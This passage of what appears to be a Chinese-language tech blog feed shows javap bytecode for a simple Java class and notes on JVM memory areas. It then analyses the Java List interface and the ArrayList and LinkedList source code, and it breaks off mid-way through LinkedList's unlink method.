Lorg/xxz/Test1;</span><br><span class="line">  #14 = Utf8               getA</span><br><span class="line">  #15 = Utf8               ()I</span><br><span class="line">  #16 = Utf8               setA</span><br><span class="line">  #17 = Utf8               (I)V</span><br><span class="line">  #18 = Utf8               SourceFile</span><br><span class="line">  #19 = Utf8               Test1.java</span><br><span class="line">  #20 = NameAndType        #7:#8          // "&lt;init&gt;":()V</span><br><span class="line">  #21 = NameAndType        #5:#6          // a:I</span><br><span class="line">  #22 = Utf8               org/xxz/Test1</span><br><span class="line">  #23 = Utf8               java/lang/Object</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span> org.xxz.Test1();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">1</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="number">0</span>: aload_0</span><br><span class="line">         1: invokespecial #1                  // Method java/lang/Object."&lt;init&gt;":()V</span><br><span class="line">         <span class="number">4</span>: aload_0</span><br><span class="line">         <span class="number">5</span>: iconst_1</span><br><span class="line">         6: putfield      #2                  // Field a:I</span><br><span class="line">         <span class="number">9</span>: <span class="keyword">return</span></span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">6</span>: <span class="number">0</span></span><br><span class="line">        line <span class="number">8</span>: <span class="number">4</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>      <span class="number">10</span>     <span class="number">0</span>  <span class="keyword">this</span>   Lorg/xxz/Test1;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getA</span><span class="params">()</span></span>;</span><br><span class="line">    descriptor: ()I</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">1</span>, locals=<span class="number">1</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="number">0</span>: aload_0</span><br><span class="line">         1: getfield      #2                  // Field a:I</span><br><span class="line">         <span class="number">4</span>: ireturn</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">11</span>: <span class="number">0</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>       <span class="number">5</span>     <span class="number">0</span>  <span class="keyword">this</span>   Lorg/xxz/Test1;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setA</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    descriptor: (I)V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">2</span>, args_size=<span class="number">2</span></span><br><span class="line">         <span class="number">0</span>: aload_0</span><br><span class="line">         <span class="number">1</span>: iload_1</span><br><span class="line">         2: putfield      #2                  // Field a:I</span><br><span class="line">         <span class="number">5</span>: <span class="keyword">return</span></span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">15</span>: <span class="number">0</span></span><br><span class="line">        line <span class="number">16</span>: <span class="number">5</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>       <span class="number">6</span>     <span class="number">0</span>  <span class="keyword">this</span>   Lorg/xxz/Test1;</span><br><span class="line">            <span class="number">0</span>       <span class="number">6</span>     <span class="number">1</span>     a   I</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: <span class="string">"Test1.java"</span></span><br></pre></td></tr></table></figure>
<p>常量池表，访问控制权限表</p>
<p>jclasslib</p>
<p>基于栈的指令集与基于寄存器的指令集之间的关系：</p>
<ol>
<li>JVM执行指令时采取的方式是基于栈的指令集</li>
<li>基于栈的指令集主要的操作由入栈和出栈</li>
<li>基于栈的指令集的优势在于它可以在不同的平台之间移植，而基于寄存器的指令集是与硬件紧密关联的，无法做到可移植</li>
<li>基于栈的指令的缺点在于完成相同的操作，指令数量通常要比基于寄存器的指令数量要多，基于栈的指令集是在内存中完成操作的，而基于寄存器的指令集是直接由CPU来执行的，它是在高速缓冲区中执行的，速度要快很多，虽然虚拟机可以采用一些优化手段，但总体来说，基于栈的指令集的执行速度要慢一些。</li>
</ol>
<p>JVM 模块</p>
<p>虚拟机栈：Stack Frame 栈帧</p>
<p>程序计数器：Program Counter</p>
<p>本地方法栈：主要用于处理本地方法</p>
<p>堆（Heap）：JVM管理的最大一块内存空间</p>
<p>方法区（Method Area）：存储元数据。永久代（Permanent Generation），从JDK1.8开始，已经彻底废弃了永久代，使用元空间（Meta Space）</p>
<p>运行时常量池：方法区的一部分内容</p>
<p>直接内存：Direct Memory</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> jvm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[List接口源码分析]]></title>
      <url>/2019/list-source/</url>
      <content type="html"><![CDATA[<p>了解基本数据结构在java中很是重要，今天在这里我们来常用的List接口，以及不同的实现。</p>
<p>ArrayList</p>
<p>LinkedList</p>
<p>Vector</p>
<p>CopyOnWriteArrayList</p>
<p>etc…</p>
<p>环境：JDK1.8</p>
<a id="more"></a>
<h2 id="接口定义"><a href="#接口定义" class="headerlink" title="接口定义"></a>接口定义</h2><p>List接口定义分为：查询，修改，批量修改，比较和hash，位置访问，搜索，迭代，视图。</p>
<h3 id="查询操作方法"><a href="#查询操作方法" class="headerlink" title="查询操作方法"></a>查询操作方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>; <span class="comment">// 返回此列表元素数量</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>; <span class="comment">// 返回此列表是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span></span>; <span class="comment">// 返回此列表是否包含o元素</span></span><br><span class="line"><span class="function">Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span></span>; <span class="comment">// 返回此列表迭代器</span></span><br><span class="line">Object[] toArray(); <span class="comment">// 返回此列表转换后的数组</span></span><br><span class="line">&lt;T&gt; T[] toArray(T[] a); <span class="comment">// 返回此列表转换后的数组范型</span></span><br></pre></td></tr></table></figure>
<h3 id="修改操作方法"><a href="#修改操作方法" class="headerlink" title="修改操作方法"></a>修改操作方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span></span>; <span class="comment">// 添加元素到此列表中</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span></span>; <span class="comment">// 从此列表中移除指定元素</span></span><br></pre></td></tr></table></figure>
<h3 id="批量修改操作方法"><a href="#批量修改操作方法" class="headerlink" title="批量修改操作方法"></a>批量修改操作方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsAll</span><span class="params">(Collection&lt;?&gt; c)</span></span>; <span class="comment">// 是否包含指定列表所有元素</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(Collection&lt;? extends E&gt; c)</span></span>; <span class="comment">// 添加指定集合所有元素到此列表中</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(<span class="keyword">int</span> index, Collection&lt;? extends E&gt; c)</span></span>; <span class="comment">// 从此列表指定index插入指定集合所有元素</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">removeAll</span><span class="params">(Collection&lt;?&gt; c)</span></span>; <span class="comment">// 从此列表中删除指定集合中包含的所有元素</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">retainAll</span><span class="params">(Collection&lt;?&gt; c)</span></span>; <span class="comment">// 仅保留此列表中包含在指定集合中的元素，相当于两个集合的交集</span></span><br><span class="line"><span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">replaceAll</span><span class="params">(UnaryOperator&lt;E&gt; operator)</span></span>&#123;...&#125; <span class="comment">// 按照指定一元操作替换此列表中所有元素, jdk8</span></span><br><span class="line"><span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparator&lt;? <span class="keyword">super</span> E&gt; c)</span> </span>&#123;...&#125; <span class="comment">// 按照指定比较器对此列表元素进行排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>; <span class="comment">// 清除此列表所有元素</span></span><br></pre></td></tr></table></figure>
<h3 id="比较和hash"><a href="#比较和hash" class="headerlink" title="比较和hash"></a>比较和hash</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span></span>; <span class="comment">// 比较两个列表是否相等</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>; <span class="comment">// 计算此列表的hash值</span></span><br></pre></td></tr></table></figure>
<h3 id="位置访问操作"><a href="#位置访问操作" class="headerlink" title="位置访问操作"></a>位置访问操作</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>; <span class="comment">// 从此列表中获取指定index元素</span></span><br><span class="line"><span class="function">E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span></span>; <span class="comment">// 从此列表指定index插入指定元素</span></span><br><span class="line"><span class="function">E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>; <span class="comment">// 从此列表移除指定index元素</span></span><br></pre></td></tr></table></figure>
<h3 id="搜索操作"><a href="#搜索操作" class="headerlink" title="搜索操作"></a>搜索操作</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span></span>; <span class="comment">// 从前往后搜索指定元素的位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lastIndexOf</span><span class="params">(Object o)</span></span>; <span class="comment">// 从后往前搜索指定元素位置</span></span><br></pre></td></tr></table></figure>
<h3 id="列表迭代器"><a href="#列表迭代器" class="headerlink" title="列表迭代器"></a>列表迭代器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ListIterator&lt;E&gt; <span class="title">listIterator</span><span class="params">()</span></span>; <span class="comment">// 返回此列表中元素的列表迭代器</span></span><br><span class="line"><span class="function">ListIterator&lt;E&gt; <span class="title">listIterator</span><span class="params">(<span class="keyword">int</span> index)</span></span>; <span class="comment">// 从指定index返回此列表中元素的列表迭代器</span></span><br></pre></td></tr></table></figure>
<h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">List&lt;E&gt; <span class="title">subList</span><span class="params">(<span class="keyword">int</span> fromIndex, <span class="keyword">int</span> toIndex)</span></span>; <span class="comment">// 返回子列表视图</span></span><br><span class="line"><span class="function"><span class="keyword">default</span> Spliterator&lt;E&gt; <span class="title">spliterator</span><span class="params">()</span> </span>&#123;...&#125; <span class="comment">// 返回可分割迭代器 splitable iterator</span></span><br></pre></td></tr></table></figure>
<h2 id="ArrayList实现"><a href="#ArrayList实现" class="headerlink" title="ArrayList实现"></a>ArrayList实现</h2><p>首先ArrayList的默认容量为10</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_CAPACITY = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
<p>其次定义了存储数据的数组以及数组中元素个数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> Object[] elementData;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> size;</span><br></pre></td></tr></table></figure>
<p><strong>从这里可以看出，我们的ArrayList底层是一个数组实现的。</strong></p>
<p>我们再看看构造方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;...&#125; <span class="comment">// 指定容量大小的构造器</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">()</span> </span>&#123;...&#125; <span class="comment">// 无参构造器</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;...&#125; <span class="comment">// 指定集合构造器</span></span><br></pre></td></tr></table></figure>
<p>构造器干了些啥呢？</p>
<p>其实很简单，就是一些数据初始化</p>
<ol>
<li>初始化elementData</li>
<li>计算size大小，如果elementData为空，则size为默认值0</li>
</ol>
<p>再来看看我们上面列的那些操作都干了啥？</p>
<p>主要看add，remove，set</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 容量检查</span></span><br><span class="line">    ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">    <span class="comment">// 设置元素</span></span><br><span class="line">    elementData[size++] = e;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>计算elementData与最小容量size+1的大小</li>
<li>判断size+1与elementData.length大小，如果size+1 - elementData.length &lt; 0 则不扩容，否则扩容</li>
<li>存放对象到elementData数组中，size并增加</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// index范围检查</span></span><br><span class="line">    rangeCheck(index);</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="comment">// 获取index索引对应的元素</span></span><br><span class="line">    E oldValue = elementData(index);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算元素位置是否移动了，并调整元素位置</span></span><br><span class="line">    <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">        System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                         numMoved);</span><br><span class="line">    <span class="comment">// 将最后一个元素设置为null</span></span><br><span class="line">    elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回index对应的元素</span></span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>index范围检查</li>
<li>获取elementData中index位置的元素</li>
<li>计算index是否小于elementData.length-1，如果是则进行一次元素位置调整。并将最后一个元素设置为null.</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// index范围检查</span></span><br><span class="line">	rangeCheck(index);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取指定index的元素</span></span><br><span class="line">	E oldValue = elementData(index);</span><br><span class="line">    <span class="comment">// 覆盖index的元素为新元素</span></span><br><span class="line">	elementData[index] = element;</span><br><span class="line">    <span class="comment">// 返回旧值</span></span><br><span class="line">	<span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>index范围检查</li>
<li>获取指定index的元素，并覆盖旧元素为新元素</li>
<li>返回旧元素</li>
</ol>
<h2 id="LinkedList实现"><a href="#LinkedList实现" class="headerlink" title="LinkedList实现"></a>LinkedList实现</h2><p>我们看看LinkedList属性</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> <span class="keyword">int</span> size = <span class="number">0</span>; <span class="comment">// 元素个数</span></span><br><span class="line"><span class="keyword">transient</span> Node&lt;E&gt; first; <span class="comment">// 头节点</span></span><br><span class="line"><span class="keyword">transient</span> Node&lt;E&gt; last; <span class="comment">// 尾节点</span></span><br></pre></td></tr></table></figure>
<p>我们再来看看Node是什么？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">	E item;</span><br><span class="line">	Node&lt;E&gt; next;</span><br><span class="line">	Node&lt;E&gt; prev;</span><br><span class="line"></span><br><span class="line">	Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class="line">		<span class="keyword">this</span>.item = element;</span><br><span class="line">		<span class="keyword">this</span>.next = next;</span><br><span class="line">		<span class="keyword">this</span>.prev = prev;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>这里我们可以看到LinkedList是使用Node节点实现，Node类似铁链的环一样，一个接着一个</strong></p>
<p>再来看看构造器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>指定集合构造器实际上是调用了addAll方法，这里我们直接从addAll说起</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>();</span><br><span class="line">    addAll(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addAll(size, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(<span class="keyword">int</span> index, Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 检查index范围</span></span><br><span class="line">    checkPositionIndex(index);</span><br><span class="line"></span><br><span class="line">    Object[] a = c.toArray();</span><br><span class="line">    <span class="keyword">int</span> numNew = a.length;</span><br><span class="line">    <span class="keyword">if</span> (numNew == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找出当前节点，与前一个节点</span></span><br><span class="line">    Node&lt;E&gt; pred, succ;</span><br><span class="line">    <span class="keyword">if</span> (index == size) &#123;</span><br><span class="line">        succ = <span class="keyword">null</span>;</span><br><span class="line">        pred = last;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        succ = node(index);</span><br><span class="line">        pred = succ.prev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 追加节点</span></span><br><span class="line">    <span class="keyword">for</span> (Object o : a) &#123;</span><br><span class="line">        E e = (E) o;</span><br><span class="line">        Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(pred, e, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (pred == <span class="keyword">null</span>)</span><br><span class="line">            first = newNode;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pred.next = newNode;</span><br><span class="line">        pred = newNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (succ == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 更新最后一个节点</span></span><br><span class="line">        last = pred;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 中间插入时，更新index节点的prev</span></span><br><span class="line">        pred.next = succ;</span><br><span class="line">        succ.prev = pred;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    size += numNew;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解释一下public boolean addAll(int index, Collection&lt;? extends E&gt; c) {…}</p>
<p>第一种情况：</p>
<p>当index == size大小时，从尾部添加。</p>
<p>第二种情况：</p>
<p>当index &lt; size大小时， 从中间插入。</p>
<p>我们依旧看看add，remove，set</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    linkLast(e);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在最后一个节点上追加节点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">linkLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; l = last;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(l, e, <span class="keyword">null</span>);</span><br><span class="line">    last = newNode;</span><br><span class="line">    <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        l.next = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x.item == <span class="keyword">null</span>) &#123;</span><br><span class="line">                unlink(x);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (o.equals(x.item)) &#123;</span><br><span class="line">                unlink(x);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">E <span class="title">unlink</span><span class="params">(Node&lt;E&gt; x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert x != null;</span></span><br><span class="line">    <span class="keyword">final</span> E element = x.item;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; next = x.next;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; prev = x.prev;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev == <span class="keyword">null</span>) &#123;</span><br><span class="line">        first = next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prev.next = next;</span><br><span class="line">        x.prev = <span 